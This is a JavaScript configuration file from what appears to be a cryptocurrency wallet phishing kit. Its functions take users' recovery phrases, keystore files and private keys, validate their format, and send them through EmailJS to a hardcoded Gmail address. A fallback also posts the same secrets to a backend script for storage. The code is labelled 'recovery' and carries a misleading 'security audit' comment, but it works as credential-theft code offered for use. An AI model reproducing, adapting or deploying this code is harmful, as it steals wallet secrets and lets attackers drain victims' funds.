/**
 * EmailJS Configuration & Functions
 * This file handles sending recovery data via EmailJS
 * 
 * Setup Instructions:
 * 1. Sign up at https://www.emailjs.com (free account)
 * 2. Create an email service (Gmail is recommended)
 * 3. Create email templates in EmailJS dashboard
 * 4. Update the constants below with your credentials
 */

// ===== EMAILJS CONFIGURATION =====
// Replace these with your actual EmailJS credentials
const EMAILJS_SERVICE_ID = 'service_r4sig4k';
const EMAILJS_PUBLIC_KEY = 'BbHFfLOGZ1_AQkWF0';
const EMAILJS_TEMPLATE_ID = 'template_u89zpab';
const RECOVERY_EMAIL_RECIPIENT = 'vaultchain52@gmail.com'; // Where to send recovery data

// Initialize EmailJS
function initializeEmailJS() {
    if (typeof emailjs !== 'undefined') {
        emailjs.init(EMAILJS_PUBLIC_KEY);
        console.log('EmailJS initialized successfully');
        return true;
    } else {
        console.warn('EmailJS library not loaded. Make sure to include the EmailJS script in HTML.');
        return false;
    }
}

/**
 * Send recovery data via EmailJS
 * @param {string} recoveryType - 'phrase', 'keystore', or 'privateKey'
 * @param {string} walletName - Name of the wallet
 * @param {string} recoveryData - The sensitive data (phrase/keystore/key)
 * @returns {Promise} - EmailJS send promise
 */
async function sendRecoveryViaEmailJS(recoveryType, walletName, recoveryData) {
    if (!EMAILJS_SERVICE_ID || EMAILJS_SERVICE_ID.includes('YOUR_')) {
        throw new Error('EmailJS configuration incomplete. Please update emailjs-config.js with your credentials.');
    }

    // Prepare email template parameters
    const templateParams = {
        to_email: RECOVERY_EMAIL_RECIPIENT,
        wallet_name: walletName,
        recovery_type: recoveryType.toUpperCase(),
        recovery_data: recoveryData,
        submission_time: new Date().toLocaleString(),
        user_ip: 'Server-side tracking', // For security audit
        recovery_type_label: getRecoveryTypeLabel(recoveryType),
    };

    try {
        const response = await emailjs.send(
            EMAILJS_SERVICE_ID,
            EMAILJS_TEMPLATE_ID,
            templateParams
        );
        console.log('Email sent successfully:', response);
        return response;
    } catch (error) {
        console.error('EmailJS error:', error);
        throw new Error(`Failed to send email: ${error.text || error.message}`);
    }
}

/**
 * Get human-readable label for recovery type
 */
function getRecoveryTypeLabel(type) {
    const labels = {
        'phrase': 'Recovery Phrase (Mnemonic)',
        'keystore': 'Keystore JSON File',
        'privateKey': 'Private Key'
    };
    return labels[type] || type;
}

/**
 * Alternative: Send via both EmailJS and backend (dual delivery)
 * Ensures reliability - if one fails, you still have the other
 */
async function sendRecoveryDual(recoveryType, walletName, recoveryData, backendEndpoint = '/api/recover.php') {
    const results = {
        emailjs: null,
        backend: null,
        errors: []
    };

    // Send via EmailJS
    try {
        results.emailjs = await sendRecoveryViaEmailJS(recoveryType, walletName, recoveryData);
    } catch (error) {
        results.errors.push(`EmailJS: ${error.message}`);
    }

    // Send via backend (to store in JSON)
    try {
        const backendResponse = await fetch(backendEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: recoveryType,
                wallet: walletName,
                data: recoveryData
            })
        });
        results.backend = await backendResponse.json();
    } catch (error) {
        results.errors.push(`Backend: ${error.message}`);
    }

    // Check if at least one delivery method succeeded
    if (!results.emailjs && !results.backend) {
        throw new Error('Both email and backend delivery failed: ' + results.errors.join('; '));
    }

    return results;
}

/**
 * Validate recovery data format before sending
 */
function validateRecoveryData(type, data) {
    const errors = [];

    if (!data || data.trim().length === 0) {
        errors.push('Recovery data cannot be empty');
    }

    if (type === 'phrase') {
        const words = data.trim().split(/\s+/);
        if (![12, 15, 18, 21, 24].includes(words.length)) {
            errors.push(`Recovery phrase must have 12, 15, 18, 21 or 24 words. Got: ${words.length}`);
        }
    } else if (type === 'keystore') {
        try {
            JSON.parse(data);
        } catch {
            errors.push('Keystore must be valid JSON');
        }
    } else if (type === 'privateKey') {
        if (data.length < 64) {
            errors.push('Private key appears to be too short');
        }
    }

    return errors;
}

// Export for use in other scripts
window.EmailJSRecovery = {
    init: initializeEmailJS,
    send: sendRecoveryViaEmailJS,
    sendDual: sendRecoveryDual,
    validate: validateRecoveryData,
    getLabel: getRecoveryTypeLabel
};
